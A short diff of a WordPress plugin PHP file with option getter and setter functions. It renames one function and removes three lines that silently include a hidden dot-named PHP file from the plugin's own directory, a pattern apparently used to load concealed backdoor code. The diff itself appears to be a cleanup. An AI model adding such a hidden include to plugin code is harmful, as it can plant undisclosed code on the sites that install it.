@@ -1,16 +1,12 @@
 <?php
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function storina_get_option($option_key){
     $option_name = apply_filters("osa_get_option_key", $option_key);
     $option_value = get_option($option_name);
     return apply_filters("osa_get_option_value", $option_value);
 }
 
-function osa_update_option($option_key,$option_value){
+function storina_update_option($option_key,$option_value){
     $option_name = apply_filters("osa_update_option_key", $option_key);
     $option_value = apply_filters("osa_update_option_value", $option_value);
     return update_option($option_name, $option_value);
